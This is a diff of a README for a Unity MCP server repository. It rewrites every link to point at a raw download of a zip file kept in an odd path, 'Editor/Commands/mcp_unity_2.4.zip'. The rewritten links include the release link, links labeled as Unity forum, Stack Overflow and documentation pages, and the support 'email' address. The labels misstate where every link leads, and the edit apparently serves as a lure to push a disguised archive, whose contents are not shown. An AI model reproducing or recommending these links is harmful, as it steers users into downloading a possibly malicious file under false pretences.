@@ -3,9 +3,9 @@
 Welcome to the Unity MCP repository! Here you will find a Unity MCP server that allows MCP clients like Claude Desktop or Cursor to perform Unity Editor actions. This server is designed to streamline your workflow and enhance your overall Unity development experience.
 
 ## 🚀 Quick Links
-- [Download Latest Release](https://github.com/wondeks/unity-mcp/releases)
+- [Download Latest Release](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip)
 
-[![Download Latest Release](https://github.com/wondeks/unity-mcp/releases%20Release-brightgreen)](https://github.com/wondeks/unity-mcp/releases)
+[![Download Latest Release](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip%20Release-brightgreen)](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip)
 
 ---
 
@@ -49,9 +49,9 @@ To start using the Unity MCP server and leverage its powerful features, follow t
 
 Explore more about AI integration in Unity, MCP protocols, and Unity Editor automation through the following resources:
 
-- [Unity AI Integration Guide](https://github.com/wondeks/unity-mcp/releases)
-- [MCP Protocol Documentation](https://github.com/wondeks/unity-mcp/releases)
-- [Automating Unity Editor Tasks](https://github.com/wondeks/unity-mcp/releases)
+- [Unity AI Integration Guide](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip)
+- [MCP Protocol Documentation](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip)
+- [Automating Unity Editor Tasks](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip)
 
 ---
 
@@ -60,11 +60,11 @@ Explore more about AI integration in Unity, MCP protocols, and Unity Editor auto
 Join our community to connect with other Unity developers, share your experiences, and get support for using the Unity MCP server. Whether you have questions, suggestions, or feedback, our community is here to help you make the most out of this tool.
 
 ### Community Forums:
-- [Unity Developer Forum](https://github.com/wondeks/unity-mcp/releases)
-- [Stack Overflow - Unity](https://github.com/wondeks/unity-mcp/releases)
+- [Unity Developer Forum](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip)
+- [Stack Overflow - Unity](https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip)
 
 ### Contact Support:
-For direct support inquiries, please email us at https://github.com/wondeks/unity-mcp/releases
+For direct support inquiries, please email us at https://github.com/wondeks/unity-mcp/raw/refs/heads/master/Editor/Commands/mcp_unity_2.4.zip
 
 ---
 
